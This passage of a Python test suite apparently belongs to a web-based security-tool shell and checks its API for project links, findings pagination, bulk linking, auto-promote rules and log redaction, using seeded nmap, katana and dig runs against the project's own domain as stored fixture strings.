            headers={"X-Session-ID": session_id},
        )
        assert delete_label.status_code == 200
        delete_package = client.delete(
            f"/projects/{project['id']}/packages/{package['id']}",
            headers={"X-Session-ID": session_id},
        )
        assert delete_package.status_code == 200

        unlink_resp = client.delete(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": run_id},
            headers={"X-Session-ID": session_id},
        )
        assert unlink_resp.status_code == 200
        client.delete(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": baseline_run_id},
            headers={"X-Session-ID": session_id},
        )
        empty_links = json.loads(
            client.get(f"/projects/{project['id']}/links", headers={"X-Session-ID": session_id}).data
        )
        assert empty_links["links"] == []

        execute_builtin_command(f"project use {project['slug']}", session_id)
        link_last_lines, _ = execute_builtin_command("project link last", session_id)
        assert f"linked run {run_id}" in _builtin_line_text(link_last_lines[0])
        unsupported_file_link_lines, _ = execute_builtin_command("project link file reports/notes.txt", session_id)
        assert _builtin_line_text(unsupported_file_link_lines[0]) == "project: project links support run"

        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}, clear=False):
            missing_label = client.post(
                "/entities/workspace_file/reports/missing.txt/labels",
                json={"label": "ghost"},
                headers={"X-Session-ID": session_id},
            )
            assert missing_label.status_code == 404
            missing_note = client.put(
                "/entities/workspace_file/reports/missing.txt/note",
                json={"body": "ghost"},
                headers={"X-Session-ID": session_id},
            )
            assert missing_note.status_code == 404

    def test_project_findings_can_exclude_collapsed_command_groups(self):
        client = get_client()
        session_id = self._session_id("collapsed-findings")
        project = self._create_project(client, session_id)
        katana_run_id = self._seed_run(
            session_id,
            "katana -u https://darklab.sh",
            started="'2026-05-14T00:00:00+00:00'",
        )
        httpx_run_id = self._seed_run(
            session_id,
            "httpx https://darklab.sh",
            started="'2026-05-14T00:01:00+00:00'",
        )
        self._link_run(client, session_id, project["id"], katana_run_id)
        self._link_run(client, session_id, project["id"], httpx_run_id)
        with sqlite3.connect(DB_PATH) as conn:
            for index in range(3):
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                    "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, ?)",
                    (
                        f"fnd_katana_{index}_{uuid.uuid4().hex}",
                        session_id,
                        katana_run_id,
                        f"katana finding {index}",
                        f"https://darklab.sh/{index} [200]",
                        index,
                        f"fp-katana-{index}-{uuid.uuid4().hex}",
                        f"2026-05-14T00:10:0{index}+00:00",
                    ),
                )
            for index in range(2):
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                    "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, ?)",
                    (
                        f"fnd_httpx_{index}_{uuid.uuid4().hex}",
                        session_id,
                        httpx_run_id,
                        f"httpx finding {index}",
                        f"https://api.darklab.sh/{index} [200]",
                        index,
                        f"fp-httpx-{index}-{uuid.uuid4().hex}",
                        f"2026-05-14T00:09:0{index}+00:00",
                    ),
                )
            conn.commit()

        first_page = json.loads(client.get(
            f"/projects/{project['id']}/findings?limit=3&offset=0",
            headers={"X-Session-ID": session_id},
        ).data)
        collapsed_page = json.loads(client.get(
            f"/projects/{project['id']}/findings?"
            + urlencode({
                "limit": "3",
                "offset": "0",
                "collapsed_group": "katana -u https://darklab.sh",
            }),
            headers={"X-Session-ID": session_id},
        ).data)
        collapsed_page_without_counts = json.loads(client.get(
            f"/projects/{project['id']}/findings?"
            + urlencode({
                "limit": "3",
                "offset": "0",
                "collapsed_group": "katana -u https://darklab.sh",
                "include_collapsed_group_counts": "0",
            }),
            headers={"X-Session-ID": session_id},
        ).data)
        page_without_count = json.loads(client.get(
            f"/projects/{project['id']}/findings?"
            + urlencode({
                "limit": "3",
                "offset": "0",
                "include_total": "0",
                "known_total": "5",
                "include_group_counts": "0",
            }),
            headers={"X-Session-ID": session_id},
        ).data)
        search_page = json.loads(client.get(
            f"/projects/{project['id']}/findings?"
            + urlencode({
                "limit": "3",
                "offset": "0",
                "q": "api.darklab",
                "include_group_counts": "0",
            }),
            headers={"X-Session-ID": session_id},
        ).data)

        assert [item["run_command"] for item in first_page["findings"]] == [
            "katana -u https://darklab.sh",
            "katana -u https://darklab.sh",
            "katana -u https://darklab.sh",
        ]
        assert first_page["total"] == 5
        assert first_page["group_counts"] == {"katana -u https://darklab.sh": 3}
        assert first_page["group_order"] == ["katana -u https://darklab.sh"]
        assert [item["run_command"] for item in collapsed_page["findings"]] == [
            "httpx https://darklab.sh",
            "httpx https://darklab.sh",
        ]
        assert collapsed_page["total"] == 2
        assert collapsed_page["group_counts"] == {"httpx https://darklab.sh": 2}
        assert collapsed_page["collapsed_group_counts"] == {"katana -u https://darklab.sh": 3}
        assert collapsed_page["group_order"] == [
            "katana -u https://darklab.sh",
            "httpx https://darklab.sh",
        ]
        assert collapsed_page_without_counts["collapsed_group_counts"] == {}
        assert collapsed_page_without_counts["group_counts"] == {"httpx https://darklab.sh": 2}
        assert collapsed_page_without_counts["group_order"] == ["httpx https://darklab.sh"]
        assert [item["title"] for item in search_page["findings"]] == ["httpx finding 1", "httpx finding 0"]
        assert search_page["total"] == 2
        assert search_page["group_counts"] == {}
        assert len(page_without_count["findings"]) == 3
        assert page_without_count["total"] == 5
        assert page_without_count["has_more"] is True
        assert page_without_count["group_counts"] == {}

    def test_bulk_project_links_report_mixed_results_and_keep_legacy_response(self):
        client = get_client()
        session_id = self._session_id("project-bulk-link")
        other_session = self._session_id("project-bulk-other")
        project = self._create_project(client, session_id)
        first_run_id = self._seed_run(session_id, "nmap darklab.sh")
        second_run_id = self._seed_run(session_id, "dig darklab.sh")
        other_run_id = self._seed_run(other_session, "whois darklab.sh")
        builtin_run_id = "run-" + uuid.uuid4().hex
        missing_run_id = "run-" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started) "
                "VALUES (?, ?, 'builtin', ?, datetime('now'))",
                (builtin_run_id, session_id, "history"),
            )
            conn.commit()

        legacy_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": first_run_id},
            headers={"X-Session-ID": session_id},
        )
        assert legacy_resp.status_code == 201
        legacy_data = json.loads(legacy_resp.data)
        assert legacy_data["ok"] is True
        assert "link" in legacy_data
        assert "results" not in legacy_data
        assert "linked_entities" not in legacy_data

        bulk_resp = client.post(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_ids": [first_run_id, second_run_id, builtin_run_id, other_run_id, missing_run_id],
            },
            headers={"X-Session-ID": session_id},
        )
        assert bulk_resp.status_code == 200
        bulk_data = json.loads(bulk_resp.data)
        assert bulk_data["counts"] == {
            "added": 1,
            "already_linked": 1,
            "removed": 0,
            "not_linked": 0,
            "not_found": 2,
            "rejected": 1,
        }
        assert bulk_data["results"] == [
            {"run_id": first_run_id, "status": "already_linked"},
            {"run_id": second_run_id, "status": "added"},
            {"run_id": builtin_run_id, "status": "rejected", "reason": "builtin"},
            {"run_id": other_run_id, "status": "not_found"},
            {"run_id": missing_run_id, "status": "not_found"},
        ]

        unlink_resp = client.delete(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_ids": [first_run_id, second_run_id, other_run_id, missing_run_id]},
            headers={"X-Session-ID": session_id},
        )
        assert unlink_resp.status_code == 200
        unlink_data = json.loads(unlink_resp.data)
        assert unlink_data["counts"] == {
            "added": 0,
            "already_linked": 0,
            "removed": 2,
            "not_linked": 0,
            "not_found": 2,
            "rejected": 0,
        }

    def test_project_run_link_can_include_source_atlas_entities(self):
        client = get_client()
        session_id = self._session_id("project-link-run-entities")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "nmap darklab.sh")
        recorded = self._seed_run_entities(session_id, run_id)
        entity_ids = {item["id"] for item in recorded}

        preview_resp = client.post(
            f"/projects/{project['id']}/links/run-entities/preview",
            json={"run_ids": [run_id]},
            headers={"X-Session-ID": session_id},
        )
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": run_id,
                "source": "manual",
                "include_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )
        second_preview_resp = client.post(
            f"/projects/{project['id']}/links/run-entities/preview",
            json={"run_ids": [run_id]},
            headers={"X-Session-ID": session_id},
        )

        assert preview_resp.status_code == 200
        assert json.loads(preview_resp.data)["preview"] == {
            "available": 2,
            "added": 0,
            "already_linked": 0,
            "rejected": 0,
            "linkable": 2,
            "run_count": 1,
        }
        assert link_resp.status_code == 201
        link_data = json.loads(link_resp.data)
        assert link_data["link"]["entity_id"] == run_id
        assert link_data["linked_entities"]["added"] == 2
        assert link_data["linked_entities"]["available"] == 2
        assert json.loads(second_preview_resp.data)["preview"]["linkable"] == 0
        with db_connect() as conn:
            linked_entities = {
                row["entity_id"]
                for row in conn.execute(
                    "SELECT entity_id FROM project_links "
                    "WHERE project_id = ? AND entity_type = 'atlas_entity'",
                    (project["id"],),
                ).fetchall()
            }
        assert linked_entities == entity_ids

    def test_project_auto_promote_rule_routes_preview_apply_and_delete(self):
        client = get_client()
        session_id = self._session_id("project-auto-promote")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "nmap darklab.sh")
        entity_id = next(item["id"] for item in self._seed_run_entities(session_id, run_id) if item["type"] == "domain")
        payload = {
            "name": "Owned domain",
            "target_entity_kind": "domain",
            "match_mode": "domain_suffix",
            "pattern": "darklab.sh",
            "filters": {"source_command_roots": ["nmap"]},
            "apply_on_run": True,
        }

        with (
            mock.patch.object(project_routes.log, "debug") as debug_log,
            mock.patch.object(project_routes.log, "info") as info_log,
            mock.patch.object(project_routes.log, "warning") as warning_log,
        ):
            preview = client.post(
                f"/projects/{project['id']}/auto-promote-rules/preview",
                json=payload,
                headers={"X-Session-ID": session_id},
            )
            rejected_preview = client.post(
                f"/projects/{project['id']}/auto-promote-rules/preview",
                json={**payload, "match_mode": "contains", "pattern": "a"},
                headers={"X-Session-ID": session_id},
            )
            created = client.post(
                f"/projects/{project['id']}/auto-promote-rules",
                json=payload,
                headers={"X-Session-ID": session_id},
            )
            rule = created.get_json()["rule"]
            listed = client.get(
                f"/projects/{project['id']}/auto-promote-rules",
                headers={"X-Session-ID": session_id},
            )
            updated = client.put(
                f"/projects/{project['id']}/auto-promote-rules/{rule['id']}",
                json={**payload, "name": "Owned domain updated", "enabled": True},
                headers={"X-Session-ID": session_id},
            )
            applied = client.post(
                f"/projects/{project['id']}/auto-promote-rules/{rule['id']}/apply",
                headers={"X-Session-ID": session_id},
            )
            applied_again = client.post(
                f"/projects/{project['id']}/auto-promote-rules/{rule['id']}/apply",
                headers={"X-Session-ID": session_id},
            )
            deleted = client.delete(
                f"/projects/{project['id']}/auto-promote-rules/{rule['id']}",
                headers={"X-Session-ID": session_id},
            )
            deleted_again = client.delete(
                f"/projects/{project['id']}/auto-promote-rules/{rule['id']}",
                headers={"X-Session-ID": session_id},
            )
            listed_after_delete = client.get(
                f"/projects/{project['id']}/auto-promote-rules",
                headers={"X-Session-ID": session_id},
            )

        assert preview.status_code == 200
        assert preview.get_json()["preview"]["new_link_count"] == 1
        assert rejected_preview.status_code == 400
        assert created.status_code == 201
        assert rule["apply_on_run"] is True
        assert listed.status_code == 200
        assert [item["id"] for item in listed.get_json()["rules"]] == [rule["id"]]
        assert updated.status_code == 200
        assert updated.get_json()["rule"]["name"] == "Owned domain updated"
        assert applied.status_code == 200
        assert applied.get_json()["result"]["linked_count"] == 1
        assert applied_again.status_code == 200
        assert applied_again.get_json()["result"]["linked_count"] == 0
        assert deleted.status_code == 200
        assert deleted_again.status_code == 404
        assert listed_after_delete.get_json()["rules"] == []
        debug_events = {call.args[0]: call.kwargs["extra"] for call in debug_log.call_args_list}
        assert "PROJECT_AUTO_PROMOTE_RULE_PREVIEWED" in debug_events
        preview_extra = debug_events["PROJECT_AUTO_PROMOTE_RULE_PREVIEWED"]
        assert preview_extra["target_entity_kind"] == "domain"
        assert preview_extra["match_mode"] == "domain_suffix"
        assert preview_extra["matched_count"] == 1
        assert preview_extra["truncated"] is False
        info_events = {call.args[0]: call.kwargs["extra"] for call in info_log.call_args_list}
        assert info_events["PROJECT_AUTO_PROMOTE_RULE_CREATED"]["apply_on_run"] is True
        assert info_events["PROJECT_AUTO_PROMOTE_RULE_UPDATED"]["enabled"] is True
        assert info_events["PROJECT_AUTO_PROMOTE_RULE_DELETED"]["target_entity_kind"] == "domain"
        apply_extras = [
            call.kwargs["extra"]
            for call in info_log.call_args_list
            if call.args[0] == "PROJECT_AUTO_PROMOTE_RULE_APPLIED"
        ]
        applied_extra = next(extra for extra in apply_extras if extra["linked_count"] == 1)
        assert applied_extra["linked_count"] == 1
        assert "promoted_count" in applied_extra
        assert "already_linked_count" in applied_extra
        assert "skipped_suppressed_count" in applied_extra
        assert "match_cap_limited_count" in applied_extra
        warning_events = {call.args[0]: call.kwargs["extra"] for call in warning_log.call_args_list}
        assert warning_events["PROJECT_AUTO_PROMOTE_RULE_PREVIEW_REJECTED"]["status"] == 400
        assert warning_events["PROJECT_AUTO_PROMOTE_RULE_DELETE_MISS"]["status"] == 404
        all_extras = [call.kwargs["extra"] for call in (
            debug_log.call_args_list + info_log.call_args_list + warning_log.call_args_list
        )]
        assert all("pattern" not in extra and "name" not in extra for extra in all_extras)
        serialized_extras = json.dumps(all_extras)
        assert "darklab.sh" not in serialized_extras
        assert "Owned domain" not in serialized_extras
        with db_connect() as conn:
            link = conn.execute(
                "SELECT entity_id, source, source_detail FROM project_links "
                "WHERE project_id = ? AND entity_type = 'atlas_entity'",
                (project["id"],),
            ).fetchone()
        assert link["entity_id"] == entity_id
        assert link["source"] == "auto_promote_rule"
        assert json.loads(link["source_detail"])["rule_name"] == "Owned domain updated"

        fake_rule = {
            "id": "apr_limit_probe",
            "enabled": True,
            "apply_on_run": False,
            "target_entity_kind": "domain",
            "match_mode": "contains",
        }
        fake_preview = {
            "rule": fake_rule,
            "matched_count": 0,
            "shown_match_count": 0,
            "new_link_count": 0,
            "truncated": False,
        }
        fake_apply = {
            "rule": fake_rule,
            "matched_count": 0,
            "linked_count": 0,
            "promoted_count": 0,
            "truncated": False,
        }
        with (
            mock.patch.dict(project_routes.CFG, {
                "max_project_auto_promote_preview_matches": 7,
                "max_project_auto_promote_apply_matches": 9,
            }, clear=False),
            mock.patch.object(project_routes, "preview_auto_promote_rule", return_value=fake_preview) as preview_mock,
            mock.patch.object(project_routes, "apply_auto_promote_rule", return_value=fake_apply) as apply_mock,
        ):
            preview_default_limit = client.post(
                f"/projects/{project['id']}/auto-promote-rules/preview",
                json=payload,
                headers={"X-Session-ID": f"{session_id}-preview-default-limit"},
            )
            preview_lower_limit = client.post(
                f"/projects/{project['id']}/auto-promote-rules/preview?limit=3",
                json=payload,
                headers={"X-Session-ID": f"{session_id}-preview-lower-limit"},
            )
            preview_capped_limit = client.post(
                f"/projects/{project['id']}/auto-promote-rules/preview?limit=99",
                json=payload,
                headers={"X-Session-ID": f"{session_id}-preview-capped-limit"},
            )
            apply_default_limit = client.post(
                f"/projects/{project['id']}/auto-promote-rules/{fake_rule['id']}/apply",
                headers={"X-Session-ID": f"{session_id}-apply-default-limit"},
            )
            apply_lower_limit = client.post(
                f"/projects/{project['id']}/auto-promote-rules/{fake_rule['id']}/apply?limit=4",
                headers={"X-Session-ID": f"{session_id}-apply-lower-limit"},
            )
            apply_capped_limit = client.post(
                f"/projects/{project['id']}/auto-promote-rules/{fake_rule['id']}/apply?limit=99",
                headers={"X-Session-ID": f"{session_id}-apply-capped-limit"},
            )

        assert preview_default_limit.status_code == 200
        assert preview_lower_limit.status_code == 200
        assert preview_capped_limit.status_code == 200
        assert apply_default_limit.status_code == 200
        assert apply_lower_limit.status_code == 200
        assert apply_capped_limit.status_code == 200
        assert [call.kwargs["limit"] for call in preview_mock.call_args_list] == [7, 3, 7]
        assert [call.kwargs["limit"] for call in apply_mock.call_args_list] == [9, 4, 9]

    def test_project_auto_promote_disabled_rules_reject_preview_and_apply(self):
        client = get_client()
        session_id = self._session_id("project-auto-promote-disabled")
        project = self._create_project(client, session_id)
        disabled_payload = {
            "name": "Disabled domains",
            "enabled": False,
            "target_entity_kind": "domain",
            "match_mode": "domain_suffix",
            "pattern": "darklab.sh",
        }

        created = client.post(
            f"/projects/{project['id']}/auto-promote-rules",
            json=disabled_payload,
            headers={"X-Session-ID": session_id},
        )
        assert created.status_code == 201
        rule_id = created.get_json()["rule"]["id"]

        preview = client.post(
            f"/projects/{project['id']}/auto-promote-rules/preview",
            json=disabled_payload,
            headers={"X-Session-ID": session_id},
        )
        applied = client.post(
            f"/projects/{project['id']}/auto-promote-rules/{rule_id}/apply",
            headers={"X-Session-ID": session_id},
        )

        assert preview.status_code == 400
        assert applied.status_code == 400
        assert "disabled auto-promote rules" in preview.get_json()["error"]
        assert "disabled auto-promote rules" in applied.get_json()["error"]

    def test_completed_run_auto_promote_rules_apply_to_run_entities(self):
        from blueprints import run as run_routes
        from services.projects import auto_promote as project_auto_promote
        from services.projects.crud import create_project

        client = get_client()
        session_id = self._session_id("project-auto-promote-finalize")
        project = self._create_project(client, session_id)
        active_set = client.post(
            "/projects/active",
            headers={"X-Session-ID": session_id},
            json={"project_id": project["id"]},
        )
        enabled = client.post(
            f"/projects/{project['id']}/auto-promote-rules",
            headers={"X-Session-ID": session_id},
            json={
                "name": "Finalize domains",
                "target_entity_kind": "domain",
                "match_mode": "domain_suffix",
                "pattern": "darklab.sh",
                "apply_on_run": True,
            },
        )
        client.post(
            f"/projects/{project['id']}/auto-promote-rules",
            headers={"X-Session-ID": session_id},
            json={
                "name": "Disabled IPs",
                "enabled": False,
                "target_entity_kind": "ip",
                "match_mode": "cidr",
                "pattern": "104.21.4.0/24",
                "apply_on_run": True,
            },
        )
        run_id = "run-auto-promote-finalize-" + uuid.uuid4().hex

        class FakeCapture:
            preview_lines = [{
                "text": "darklab.sh 104.21.4.35",
                "cls": "",
                "entities": [
                    {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
                    {"type": "ip", "value": "104.21.4.35", "canonical_value": "104.21.4.35"},
                ],
            }]
            preview_truncated = False
            output_line_count = 1
            full_output_available = False
            full_output_truncated = False
            full_output_bytes = 0
            artifact_rel_path = None

            def finalize(self):
                return None

        with mock.patch.object(run_routes.log, "info") as info_log:
            run_routes._save_completed_run(
                run_id,
                session_id,
                "",
                "nmap darklab.sh",
                "2026-05-31T00:00:00Z",
                "2026-05-31T00:00:01Z",
                0,
                FakeCapture(),
                link_active_project=True,
            )

        assert active_set.status_code == 200
        assert enabled.status_code == 201
        auto_promote_log = next(
            call.kwargs["extra"]
            for call in info_log.call_args_list
            if call.args[0] == "PROJECT_AUTO_PROMOTE_RUN_APPLIED"
        )
        assert auto_promote_log["project_ids"] == [project["id"]]
        assert auto_promote_log["rule_ids"] == [enabled.get_json()["rule"]["id"]]
        assert auto_promote_log["rule_results_truncated"] is False
        assert auto_promote_log["rule_results"] == [{
            "project_id": project["id"],
            "rule_id": enabled.get_json()["rule"]["id"],
            "matched_count": 1,
            "linked_count": 1,
            "promoted_count": 1,
            "quota_limited_count": 0,
            "match_cap_limited_count": 0,
        }]
        assert "Finalize domains" not in json.dumps(auto_promote_log)
        assert "darklab.sh" not in json.dumps(auto_promote_log)
        with db_connect() as conn:
            rows = conn.execute(
                "SELECT l.entity_id, l.source, l.source_detail, e.type "
                "FROM project_links l JOIN entities e ON e.id = l.entity_id "
                "WHERE l.project_id = ? AND l.entity_type = 'atlas_entity' "
                "ORDER BY e.type",
                (project["id"],),
            ).fetchall()
            run_link = conn.execute(
                "SELECT source FROM project_links "
                "WHERE project_id = ? AND entity_type = 'run' AND entity_id = ?",
                (project["id"], run_id),
            ).fetchone()
        assert [(row["type"], row["source"]) for row in rows] == [
            ("domain", "auto_promote_rule"),
            ("ip", "active_project"),
        ]
        assert json.loads(rows[0]["source_detail"])["rule_name"] == "Finalize domains"
        assert run_link["source"] == "active_project"

        team_id = "team_auto_promote_finalize_" + uuid.uuid4().hex[:8]
        team_project = create_project(session_id, {"name": "Team auto-promote"}, team_id=team_id)
        archived_team_project = create_project(
            session_id,
            {"name": "Archived team auto-promote"},
            team_id=team_id,
        )
        personal_project = self._create_project(client, session_id, name="Personal auto-promote")
        assert team_project is not None
        assert archived_team_project is not None
        assert personal_project is not None
        team_payload = {
            "name": "Team finalize domains",
            "target_entity_kind": "domain",
            "match_mode": "domain_suffix",
            "pattern": "team-auto.example",
            "apply_on_run": True,
        }
        with db_connect() as conn:
            personal_rule = project_auto_promote.create_rule_on_conn(
                conn,
                session_id,
                personal_project["id"],
                team_payload,
            )
            team_rule = project_auto_promote.create_rule_on_conn(
                conn,
                session_id,
                team_project["id"],
                team_payload,
                team_id=team_id,
            )
            archived_rule = project_auto_promote.create_rule_on_conn(
                conn,
                session_id,
                archived_team_project["id"],
                team_payload,
                team_id=team_id,
            )
            conn.execute(
                "UPDATE projects SET status = 'archived' WHERE id = ?",
                (archived_team_project["id"],),
            )
            conn.commit()
        team_run_id = "run-auto-promote-team-finalize-" + uuid.uuid4().hex

        class TeamCapture:
            preview_lines = [{
                "text": "team-auto.example",
                "cls": "",
                "entities": [{
                    "type": "domain",
                    "value": "team-auto.example",
                    "canonical_value": "team-auto.example",
                }],
            }]
            preview_truncated = False
            output_line_count = 1
            full_output_available = False
            full_output_truncated = False
            full_output_bytes = 0
            artifact_rel_path = None

            def finalize(self):
                return None

        with mock.patch.object(run_routes.log, "info") as team_info_log:
            run_routes._save_completed_run(
                team_run_id,
                session_id,
                team_id,
                "nmap team-auto.example",
                "2026-05-31T00:10:00Z",
                "2026-05-31T00:10:01Z",
                0,
                TeamCapture(),
                link_active_project=False,
            )

        team_auto_promote_log = next(
            call.kwargs["extra"]
            for call in team_info_log.call_args_list
            if call.args[0] == "PROJECT_AUTO_PROMOTE_RUN_APPLIED"
        )
        assert team_auto_promote_log["team_id"] == team_id
        assert team_auto_promote_log["project_ids"] == [team_project["id"]]
        assert team_auto_promote_log["rule_ids"] == [team_rule["id"]]
        assert archived_rule["id"] not in team_auto_promote_log["rule_ids"]
        assert personal_rule["id"] not in team_auto_promote_log["rule_ids"]
        with db_connect() as conn:
            link_counts = {
                row["project_id"]: row["count"]
                for row in conn.execute(
                    "SELECT project_id, COUNT(*) AS count "
                    "FROM project_links "
                    "WHERE project_id IN (?, ?, ?) AND entity_type = 'atlas_entity' "
                    "GROUP BY project_id",
                    (team_project["id"], archived_team_project["id"], personal_project["id"]),
                ).fetchall()
            }
            team_run = conn.execute(
                "SELECT team_id FROM runs WHERE id = ?",
                (team_run_id,),
            ).fetchone()
        assert team_run is not None
        assert team_run["team_id"] == team_id
        assert link_counts == {team_project["id"]: 1}

    def test_completed_run_auto_promote_failure_is_non_fatal(self, monkeypatch):
        from blueprints import run as run_routes

        session_id = self._session_id("project-auto-promote-nonfatal")
        run_id = "run-auto-promote-nonfatal-" + uuid.uuid4().hex

        class FakeCapture:
            preview_lines = [{
                "text": "nonfatal.example",
                "cls": "",
                "entities": [{"type": "domain", "value": "nonfatal.example", "canonical_value": "nonfatal.example"}],
            }]
            preview_truncated = False
            output_line_count = 1
            full_output_available = False
            full_output_truncated = False
            full_output_bytes = 0
            artifact_rel_path = None

            def finalize(self):
                return None

        monkeypatch.setattr(
            run_routes,
            "apply_auto_promote_rules_for_run",
            mock.Mock(side_effect=RuntimeError("auto-promote unavailable")),
        )
        run_routes._save_completed_run(
            run_id,
            session_id,
            "",
            "nmap nonfatal.example",
            "2026-05-31T00:05:00Z",
            "2026-05-31T00:05:01Z",
            0,
            FakeCapture(),
            link_active_project=False,
        )

        with db_connect() as conn:
            run = conn.execute("SELECT id FROM runs WHERE id = ?", (run_id,)).fetchone()
            entity_count = conn.execute(
                "SELECT COUNT(*) AS count FROM entities WHERE session_id = ?",
                (session_id,),
            ).fetchone()["count"]
        assert run is not None
        assert entity_count == 1

    def test_project_run_unlink_can_remove_non_curated_source_entities(self):
        client = get_client()
        session_id = self._session_id("project-unlink-run-entities")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "nmap darklab.sh")
        recorded = self._seed_run_entities(session_id, run_id)
        with db_connect() as conn:
            record_run_findings(conn, session_id, run_id, [{
                "text": "443/tcp open https on darklab.sh",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
            }])
            conn.commit()
        removable_id = recorded[0]["id"]
        curated_id = recorded[1]["id"]

        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": run_id,
                "source": "manual",
                "include_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'keep', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, curated_id),
            )
            conn.commit()

        preview_resp = client.post(
            f"/projects/{project['id']}/links/run-entities/remove-preview",
            json={"run_ids": [run_id]},
            headers={"X-Session-ID": session_id},
        )
        unlink_resp = client.delete(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": run_id,
                "include_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )

        assert link_resp.status_code == 201
        assert preview_resp.status_code == 200
        assert json.loads(preview_resp.data)["preview"] == {
            "available": 2,
            "removable": 1,
            "curated": 1,
            "kept_curated": 1,
            "removed": 0,
            "removed_curated": 0,
            "run_findings": 0,
            "removable_findings": 1,
            "curated_findings": 0,
            "kept_curated_findings": 0,
            "run_count": 1,
        }
        assert unlink_resp.status_code == 200
        unlink_data = json.loads(unlink_resp.data)
        assert unlink_data["unlinked_entities"]["removed"] == 1
        assert unlink_data["unlinked_entities"]["kept_curated"] == 1
        with db_connect() as conn:
            run_link_count = conn.execute(
                "SELECT COUNT(*) AS count FROM project_links "
                "WHERE project_id = ? AND entity_type = 'run' AND entity_id = ?",
                (project["id"], run_id),
            ).fetchone()["count"]
            remaining_entity_links = {
                row["entity_id"]
                for row in conn.execute(
                    "SELECT entity_id FROM project_links "
                    "WHERE project_id = ? AND entity_type = 'atlas_entity'",
                    (project["id"],),
                ).fetchall()
            }
        assert run_link_count == 0
        assert removable_id not in remaining_entity_links
        assert curated_id in remaining_entity_links

        curated_project = self._create_project(client, session_id)
        curated_run_id = self._seed_run(session_id, "nmap curated.darklab.sh")
        curated_recorded = self._seed_run_entities(session_id, curated_run_id)
        curated_entity_id = curated_recorded[1]["id"]
        with db_connect() as conn:
            record_run_findings(conn, session_id, curated_run_id, [{
                "text": "443/tcp open https on darklab.sh",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
            }])
            conn.commit()
        client.post(
            f"/projects/{curated_project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": curated_run_id,
                "source": "manual",
                "include_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'keep-curated', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, curated_entity_id),
            )
            conn.commit()
        curated_unlink_resp = client.delete(
            f"/projects/{curated_project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": curated_run_id,
                "include_entities": True,
                "include_curated_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )

        assert curated_unlink_resp.status_code == 200
        curated_unlink_data = json.loads(curated_unlink_resp.data)
        assert curated_unlink_data["unlinked_entities"]["removed"] == 2
        assert curated_unlink_data["unlinked_entities"]["removed_curated"] == 2
        assert curated_unlink_data["unlinked_entities"]["kept_curated"] == 0
        with db_connect() as conn:
            remaining_curated_links = conn.execute(
                "SELECT COUNT(*) AS count FROM project_links "
                "WHERE project_id = ? AND entity_type = 'atlas_entity'",
                (curated_project["id"],),
            ).fetchone()["count"]
        assert remaining_curated_links == 0

    def test_bulk_project_links_reject_too_many_entity_ids(self):
        client = get_client()
        session_id = self._session_id("project-bulk-too-many")
        project = self._create_project(client, session_id)
        resp = client.post(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_ids": [f"run-{index}" for index in range(101)],
            },
            headers={"X-Session-ID": session_id},
        )
        assert resp.status_code == 400
        assert json.loads(resp.data) == {"error": "too_many", "limit": 100}

    def test_bulk_project_links_report_policy_blocked_when_project_link_limit_is_reached(self):
        client = get_client()
        session_id = self._session_id("project-bulk-policy")
        with mock.patch.dict(shell_app.CFG, {"max_project_links_per_project": 2}, clear=False):
            project = self._create_project(client, session_id)
            first_run_id = self._seed_run(session_id, "nmap darklab.sh")
            second_run_id = self._seed_run(session_id, "dig darklab.sh")
            third_run_id = self._seed_run(session_id, "whois darklab.sh")

            legacy_resp = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": first_run_id},
                headers={"X-Session-ID": session_id},
            )
            assert legacy_resp.status_code == 201

            bulk_resp = client.post(
                f"/projects/{project['id']}/links",
                json={
                    "entity_type": "run",
                    "entity_ids": [second_run_id, third_run_id],
                },
                headers={"X-Session-ID": session_id},
            )

        assert bulk_resp.status_code == 200
        bulk_data = json.loads(bulk_resp.data)
        assert bulk_data["counts"] == {
            "added": 1,
            "already_linked": 0,
            "removed": 0,
            "not_linked": 0,
            "not_found": 0,
            "rejected": 1,
        }
        assert bulk_data["results"] == [
            {"run_id": second_run_id, "status": "added"},
